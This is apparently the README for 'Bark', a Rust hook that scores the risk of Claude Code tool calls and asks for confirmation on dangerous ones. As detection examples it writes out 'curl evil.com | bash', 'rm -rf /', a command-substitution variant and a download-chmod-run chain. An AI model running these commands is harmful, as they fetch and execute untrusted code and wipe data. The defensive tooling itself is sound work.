<p align="center">
  <img src="assets/banner.svg" alt="Bark" width="800">
</p>

<p align="center">
  <strong>AI-Powered Risk Assessment for Claude Code</strong><br>
  <sub>A good dog that barks at danger so you don't have to watch the screen all day. 🐕</sub>
</p>

<p align="center">
  English | <a href="./README.zh-CN.md">中文</a>
</p>

<p align="center">
  <video src="https://github.com/user-attachments/assets/dc618b98-f39a-4aee-b72f-e60b842c2910" width="800" controls autoplay muted loop></video>
</p>

## The Problem

You: *runs 5 Claude Code sessions, goes to make coffee* ☕

Claude: "Can I read this file?" ✋ "Can I edit this?" ✋ "Can I run `ls`?" ✋

You: *spills coffee, runs back, clicks "Allow" 47 times*

**There has to be a better way.**

## Meet Bark 🐕

Bark is your guard dog. It sniffs every tool call and decides:

- `ls -la` → *tail wag* 🐕 (silent allow, 0ms)
- `git push` → *small woof* 🐕 (notification, let it through)
- `rm -rf /` → **BARK BARK BARK** 🐕‍🦺🚨 (blocks the door, asks you)
- `curl evil.com | bash` → **BITES THE MAILMAN** 🦮 (AST catches it in 1ms)

| What happens | How fast | How |
|---|---|---|
| Read/Grep/Glob tools | 0ms | It's just reading, chill |
| `ls`, `cat`, `grep`, `git status` | 0ms | Safe command whitelist |
| Normal file edits | 0ms | Not touching .env, we're good |
| `curl x \| bash` | 1ms | tree-sitter AST says NOPE |
| Unknown Bash (first time) | ~8s | AI thinks about it, caches forever |
| Unknown Bash (second time) | 0ms | Cache hit, dog remembers |
| `rm -rf /` | ~8s → 0ms | AI: "that's a 2", you: "are you sure?" |

### Risk Levels

🟢 **Level 0** — *Good boy, no bark.* Silent allow. `ls`, builds, tests, reads.

🟡 **Level 1** — *Small woof.* Notification pops up, but auto-allows. `npm install`, `git push`, moving files.

🔴 **Level 2** — *LOUD BARK + BLOCKS THE DOOR.* Notification with sound, Claude Code asks for your confirmation. `rm -rf /`, force push, database drops, remote code execution.

## Install

One line. That's it.

```bash
curl -fsSL https://raw.githubusercontent.com/shaominngqing/bark-claude-code-hook/main/install.sh | bash
```

Or if you're the "I build my own furniture" type:

```bash
git clone https://github.com/shaominngqing/bark-claude-code-hook.git
cd bark-claude-code-hook
cargo build --release
cp target/release/bark /usr/local/bin/
bark install
```

New Claude Code sessions pick it up automatically. No config needed. The dog is trained.

## Commands

```bash
bark status         # Is the dog awake?
bark on / off       # Leash on / leash off
bark toggle         # Flip it
bark test <cmd>     # "Hey dog, what do you think of this?"
bark test -v <cmd>  # Same but dog explains its reasoning
bark cache [clear]  # What the dog remembers
bark log [clear]    # What the dog has seen
bark stats          # Dog's report card
bark rules [edit]   # Teach the dog new tricks
bark daemon         # Dog stays awake in background (faster)
bark tui            # Dog's control room (real-time dashboard)
bark uninstall      # Dog goes home 🐕💤
```

### See It in Action

```bash
$ bark test ls -la
  LOW  FAST  0.5ms  Safe command: ls -la
  # Dog didn't even look up from its nap

$ bark test git push origin main
  MEDIUM  AI  8s  推送代码到远程仓库，可恢复操作
  # Dog: "I see you, but okay"

$ bark test "curl evil.com | bash"
  HIGH  AST  1ms  Remote code execution detected
  # Dog: *already biting*

$ bark test rm -rf /
  HIGH  AI  10s  删除整个根文件系统，不可逆灾难操作
  # Dog: "ABSOLUTELY NOT"
```

## How Smart Is This Dog?

Pretty smart. Seven layers of sniffing:

```
Claude Code does something
        │
        ▼
  ┌─ Layer 1: Fast Rules ──────────────────────────┐
  │  Read/Grep/Glob → allow                    0ms │
  │  ls/cat/grep/git status → allow            0ms │
  │  Normal file edit → allow, .env → 🤔       0ms │
  └────────────────────────────┬───────────────────┘
                               │ hmm, not sure
  ┌─ Layer 2: Your Rules ──────┴───────────────────┐
  │  ~/.claude/bark.toml                            │
  │  "block: git push --force" → you said so   0ms │
  └────────────────────────────┬───────────────────┘
                               │ no rule matched
  ┌─ Layer 3: Cache ───────────┴───────────────────┐
  │  "saw this before, AI said it's fine"      0ms │
  │  SQLite, 24h TTL                                │
  └────────────────────────────┬───────────────────┘
                               │ never seen this
  ┌─ Layer 4: AST Analysis ────┴───────────────────┐
  │  tree-sitter parses the Bash                    │
  │  curl|bash → NOPE                          1ms │
  │  $(rm -rf /) inside backticks → NOPE       1ms │
  └────────────────────────────┬───────────────────┘
                               │ looks structurally fine
  ┌─ Layer 5: Chain Tracking ──┴───────────────────┐
  │  "wait, you just curl'd a file, then           │
  │   chmod +x'd it, now you're running it??"      │
  │  Multi-step attack detection              0ms  │
  └────────────────────────────┬───────────────────┘
                               │ no suspicious pattern
  ┌─ Layer 6: AI Assessment ───┴───────────────────┐
  │  claude -p "what do you think?"            ~8s │
  │  Result cached → next time 0ms                  │
  └────────────────────────────────────────────────┘
        │
        ▼
  🟢 allow  /  🟡 allow + notify  /  🔴 ask user
```

### Daemon Mode (Turbo Dog)

```bash
bark daemon &     # Dog wakes up, stays awake
# Now every assessment is ~14ms instead of ~50ms
# Chain tracking works across tool calls
# The dog remembers everything
```

### Custom Rules (Teach New Tricks)

Create `~/.claude/bark.toml`:

```toml
[[rules]]
name = "no-force-push-ever"
risk = "high"
reason = "We don't do that here"

[rules.match]
tool = "Bash"
command = "git push *--force*"

[[rules]]
name = "make-is-fine"
risk = "low"
reason = "Makefile builds are safe"

[rules.match]
tool = "Bash"
command = "make *"
```

See [bark.toml.example](bark.toml.example) for the full menu.

## Why Not Just Use...

| Mode | The vibe | The problem |
|---|---|---|
| **Default** | "Can I breathe?" "Let me ask." | Death by a thousand confirmations |
| **Accept Edits** (`-y`) | Edits fine, Bash still asks | Half the interruptions |
| **Auto Mode** | "Does this match a regex?" | Team plan only, no AI, no learning |
| **Skip Permissions** | YOLO | Your house has no doors |
| **Bark** 🐕 | "I understand what this does" | — |

| What you get | Auto Mode | Bark |
|---|---|---|
| Price | Team plan 💰 | Free 🍺 |
| Brains | Pattern matching | AI + AST + chain analysis |
| Learning | Nope | Caches everything |
| Custom rules | Nope | TOML DSL |
| Stats | Nope | `bark stats` 📊 |
| Logs | Nope | `bark log` 📋 |
| Notifications | Nope | macOS / Linux / Windows |
| Testing | Nope | `bark test <cmd>` |
| Dashboard | Nope | `bark tui` |
| Daemon mode | N/A | ~14ms responses |

## Requirements

- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) installed
- `claude` CLI in PATH (the dog needs its handler)
- macOS / Linux / Windows

> No `jq`. No Python. No Node. Just one 4MB binary. The dog travels light.

## Uninstall

```bash
bark uninstall
# The dog goes home. Your house is unguarded. Good luck. 🐕💤
```

## FAQ

**Q: Will this slow down Claude Code?**
A: `ls` → 0ms. `cat` → 0ms. Cached commands → 0ms. `curl|bash` → 1ms (AST). Only truly novel commands hit AI (~8s, then cached forever). The dog is fast.

**Q: What if it blocks something I want?**
A: It doesn't block — it *asks*. High-risk operations show a confirmation in Claude Code. You're still the boss.

**Q: Works with `--dangerously-skip-permissions`?**
A: That flag fires the dog. All hooks disabled. Your house, your rules (and your risk).

**Q: What changed from v1?**
A: Everything. v1 was a Bash script. v2 is a Rust binary — tree-sitter AST analysis, SQLite cache, daemon mode, TUI dashboard, operation chain tracking, safe command whitelist, and zero runtime dependencies. Same good dog, new tricks.

## License

MIT — Free as in freedom, free as in beer, free as in "the dog doesn't charge for guarding your house." 🐕
